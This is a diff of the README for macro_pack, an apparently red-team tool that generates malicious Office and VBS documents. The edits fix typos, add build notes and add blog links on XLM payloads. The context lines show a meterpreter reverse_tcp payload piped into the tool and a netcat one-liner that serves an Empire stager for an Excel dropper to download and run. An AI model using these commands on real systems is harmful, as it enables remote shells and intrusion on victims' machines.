@@ -108,7 +108,7 @@ The pro mode includes features such as:
 Some short demo videos are available on the [sevagas youtube channel](https://www.youtube.com/channel/UCgWXxtLNEOeNuEFO3ZgbEOw).
 
 Note that MP pro is only available as a commercial offer for professionals.
-If you are in an offensive security audit team and would like more informtion on how to get "pro" version you can contact me at emeric.nasi[ at ]sevagas.com.
+If you are in an offensive security audit team and would like more information on how to get "pro" version you can contact me at emeric.nasi[ at ]sevagas.com using your professional email address.
 
 
 
@@ -123,6 +123,8 @@ macro_pack.exe --help
 ```
 
 ### Install from sources
+
+You need to be on a Windows machine to build MacroPack.
 Download and install dependencies:
 ```bash
 git clone https://github.com/sevagas/macro_pack.git
@@ -139,7 +141,7 @@ python macro_pack.py --help # if python3 is default install
   
 If you want to produce a standalone exe using pyinstaller:  
 * Install pyinstaller: pip install pyinstaller
-* Double-click on the "build.bat" script on a Windows machine.  
+* Double-click on the "build.bat" script.
 
 The resulted macro\_pack.exe will be inside the **bin** directory.  
 
@@ -180,7 +182,7 @@ msfvenom.bat -p windows/meterpreter/reverse_tcp LHOST=192.168.0.5 -f vba | macro
 
 - Download and execute Empire Launcher stager without powershell.exe by using DROPPER_PS template
 ```bash
-# 1 Generate a fiez containing Empire lauchcher 
+# 1 Generate a file containing Empire lauchcher 
 # 2 Make that file available on web server, ex with netcat:
 { echo -ne "HTTP/1.0 200 OK\r\n\r\n"; cat empire_stager.cmd; } | nc -l -p 6666 -q1
 # 3 Use macro\_pack  to generate DROPPER_PS payload in Excel file
@@ -427,7 +429,9 @@ If you have an issue with macro\_pack AV detection you can write to us for advic
 
 ## Relevant resources
 
-Blog posts about hacking with MS Office, VBS,  and other retro stuff security:
+Blog posts about hacking with MS Office, VBS, and other retro stuff security:
+ - https://blog.sevagas.com/?EXCEL-4-0-XLM-macro-in-MacroPack-Pro (Excel 4.0 payloads in MacroPack Pro)
+ - https://blog.sevagas.com/?Advanced-MacroPack-payloads-XLM-Injection (XLM injection in MacroPack Pro)
  - https://subt0x11.blogspot.fr/2018/04/wmicexe-whitelisting-bypass-hacking.html
  - http://blog.sevagas.com/?My-VBA-Bot (write a full VBA RAT, includes how to bypass VBOM protection)
  - http://blog.sevagas.com/?Hacking-around-HTA-files  (run hta code in non-hta files and hta polyglots)
@@ -435,7 +439,6 @@ Blog posts about hacking with MS Office, VBS,  and other retro stuff security:
  - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/ (About Dynamic Data Exchange attacks)
  - https://enigma0x3.net/2017/09/11/lateral-movement-using-excel-application-and-dcom/
  - https://labs.mwrinfosecurity.com/blog/dll-tricks-with-vba-to-improve-offensive-macro-capability/
- - https://blog.quarkslab.com/analysis-of-ms16-104-url-files-security-feature-bypass-cve-2016-3353.html
  
  Other useful links:
  - https://github.com/p3nt4/PowerShdll (Run PowerShell with dlls only)
